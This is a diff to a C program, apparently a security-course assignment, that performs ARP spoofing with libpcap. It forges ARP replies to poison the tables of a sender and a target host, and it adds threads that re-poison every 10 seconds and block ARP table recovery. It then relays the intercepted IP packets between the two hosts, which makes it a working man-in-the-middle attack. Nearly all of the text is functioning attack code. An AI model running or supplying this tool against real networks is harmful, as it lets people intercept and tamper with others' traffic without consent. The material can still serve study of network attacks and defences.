@@ -62,8 +62,11 @@ int main(int argc, char *argv[])
 	printf("[Sender   IP  Address] %s", argv[2]); puts("");
 
 	MAKE_ARPREQ_STRUCT(arp_request, attacker_MAC_array, attacker_IP_int, sender_IP_int);
-	pcap_sendpacket(handle, (uint8_t *)arp_request, sizeof(my_etharp_hdr));
-	GET_SENDER_MAC(sender_MAC_array, sender_IP_int, handle, header, packet);
+	do
+	{
+		pcap_sendpacket(handle, (uint8_t *)arp_request, sizeof(my_etharp_hdr));
+		if(GET_SENDER_MAC(sender_MAC_array, sender_IP_int, handle, header, packet)) { break; }
+	} while(1);
 	printf("[Sender   MAC Address] "); PRINT_MAC(sender_MAC_array); puts("\n");
 
 	inet_aton(argv[3], target_IP_struct);
@@ -71,15 +74,18 @@ int main(int argc, char *argv[])
 	printf("[Target   IP  Address] %s", argv[3]); puts("");
 	
 	MAKE_ARPREQ_STRUCT(arp_request, attacker_MAC_array, attacker_IP_int, target_IP_int);
-	pcap_sendpacket(handle, (uint8_t *)arp_request, sizeof(my_etharp_hdr));
-	GET_SENDER_MAC(target_MAC_array, target_IP_int, handle, header, packet);
+	do
+	{
+		pcap_sendpacket(handle, (uint8_t *)arp_request, sizeof(my_etharp_hdr));
+		if(GET_SENDER_MAC(target_MAC_array, target_IP_int, handle, header, packet)) { break; }
+	} while(1);
 	printf("[Target   MAC Address] "); PRINT_MAC(target_MAC_array); puts("\n");
+
+	puts("[+] Retrieved all required information!\n");
 
 	MAKE_ARPREP_STRUCT(arp_reply2sender, attacker_MAC_array, sender_MAC_array, sender_IP_int, target_IP_int);
 	MAKE_ARPREP_STRUCT(arp_reply2target, attacker_MAC_array, target_MAC_array, target_IP_int, sender_IP_int);
-
-	pcap_sendpacket(handle, (uint8_t *)arp_reply2sender, sizeof(my_etharp_hdr)); puts("sender <- attacker    target : initial infection");
-	pcap_sendpacket(handle, (uint8_t *)arp_reply2target, sizeof(my_etharp_hdr)); puts("sender    attacker -> target : initial infection");
+	puts("[+] Built ARP packets\n");
 
 	pthread_t tid;
 
@@ -89,9 +95,16 @@ int main(int argc, char *argv[])
 	memcpy(info->arp_reply2sender, (uint8_t *)arp_reply2sender, sizeof(my_etharp_hdr));
 	memcpy(info->arp_reply2target, (uint8_t *)arp_reply2target, sizeof(my_etharp_hdr));
 
+	pcap_sendpacket(handle, (uint8_t *)arp_reply2sender, sizeof(my_etharp_hdr)); puts("[  INIT  ] sender <- attacker    target");
+	pcap_sendpacket(handle, (uint8_t *)arp_reply2target, sizeof(my_etharp_hdr)); puts("[  INIT  ] sender    attacker -> target"); puts("");
+
+// Extra level of assurance
+	pthread_create(&tid, NULL, SEND_ARP, (void *)info);
+	puts("[+] Initiated thread, periodically (10s) poisoning arp table\n");
+
 	pthread_create(&tid, NULL, BLOCK_RECOVERY, (void *)info);
-
-
+	puts("[+] Initiated thread, blocking arp table recovery\n");
+	puts("[+] Displaying network traffic...\n");
 
 // Relay packets
 	while (1)
@@ -104,37 +117,61 @@ int main(int argc, char *argv[])
 		uint8_t *n_packet = (uint8_t *)calloc(1, header->caplen);
 		memcpy(n_packet, packet, header->caplen);
 	
-		int cnt1 = 0;
-		int cnt2 = 0;
+		int mcnt1 = 0;
+		int mcnt2 = 0;
+
+		bool smac1_ok = 0;
+		bool smac2_ok = 0;
+
+		bool dmac_ok = 0;
+
+		bool dip_ok = 0;
 
 		for (int i = 0; i < 6; i++)
 		{
-			if (((my_etharp_hdr *)n_packet)->SMAC[i] == sender_MAC_array[i]) { cnt1++; }
-			if (((my_etharp_hdr *)n_packet)->SMAC[i] == target_MAC_array[i]) { cnt2++; }
+			if (((my_etharp_hdr *)n_packet)->SMAC[i] == sender_MAC_array[i]) { mcnt1++; }
+			if (((my_etharp_hdr *)n_packet)->SMAC[i] == target_MAC_array[i]) { mcnt2++; }
 		}
 
-		if (cnt1 == 6)
+		if (mcnt1 == 6) { smac1_ok = 1; }
+		if (mcnt2 == 6) { smac2_ok = 1; }
+
+		mcnt1 = 0;
+		mcnt2 = 0;
+
+		for (int i = 0; i < 6; i++)
+		{
+			if (((my_etharp_hdr *)n_packet)->DMAC[i] == attacker_MAC_array[i]) { mcnt1++; }
+		}
+
+		if (mcnt1 == 6) { dmac_ok = 1; }
+
+		if (dmac_ok)
 		{
 			uint16_t PCKT_ETHERTYPE = ntohs(((my_etharp_hdr *)n_packet)->ETHTYPE);
 			if (PCKT_ETHERTYPE == ETHERTYPE_IP)
 			{
-				// Relay IP packets
-				memcpy(((my_etharp_hdr *)n_packet)->DMAC, target_MAC_array, 6 * sizeof(uint8_t));
-				memcpy(((my_etharp_hdr *)n_packet)->SMAC, attacker_MAC_array, 6 * sizeof(uint8_t));
-				pcap_sendpacket(handle, (uint8_t *)n_packet, header->caplen); puts("sender -> attacker -> target : relay");
+				if (((((struct libnet_ipv4_hdr *)(n_packet + sizeof(struct libnet_ethernet_hdr)))->ip_dst).s_addr) != attacker_IP_int)
+				{
+					dip_ok = 1; 
+				}
 			}
 		}
 
-		if (cnt2 == 6)
+		if (smac1_ok && dmac_ok && dip_ok)
 		{
-			uint16_t PCKT_ETHERTYPE = ntohs(((my_etharp_hdr *)n_packet)->ETHTYPE);
-			if (PCKT_ETHERTYPE == ETHERTYPE_IP)
-			{
-				// Relay IP packets
-				memcpy(((my_etharp_hdr *)n_packet)->DMAC, sender_MAC_array, 6 * sizeof(uint8_t));
-				memcpy(((my_etharp_hdr *)n_packet)->SMAC, attacker_MAC_array, 6 * sizeof(uint8_t));
-				pcap_sendpacket(handle, (uint8_t *)n_packet, header->caplen); puts("sender <- attacker <- target : relay");
-			}
+			// Relay IP packets
+			memcpy(((my_etharp_hdr *)n_packet)->DMAC, target_MAC_array, 6 * sizeof(uint8_t));
+			memcpy(((my_etharp_hdr *)n_packet)->SMAC, attacker_MAC_array, 6 * sizeof(uint8_t));
+			pcap_sendpacket(handle, (uint8_t *)n_packet, header->caplen); puts("[  RLAY  ] sender -> attacker -> target");
+		}
+
+		if (smac2_ok && dmac_ok && dip_ok)
+		{
+			// Relay IP packets
+			memcpy(((my_etharp_hdr *)n_packet)->DMAC, sender_MAC_array, 6 * sizeof(uint8_t));
+			memcpy(((my_etharp_hdr *)n_packet)->SMAC, attacker_MAC_array, 6 * sizeof(uint8_t));
+			pcap_sendpacket(handle, (uint8_t *)n_packet, header->caplen); puts("[  RLAY  ] sender <- attacker <- target");
 		}
 
 		free(n_packet);
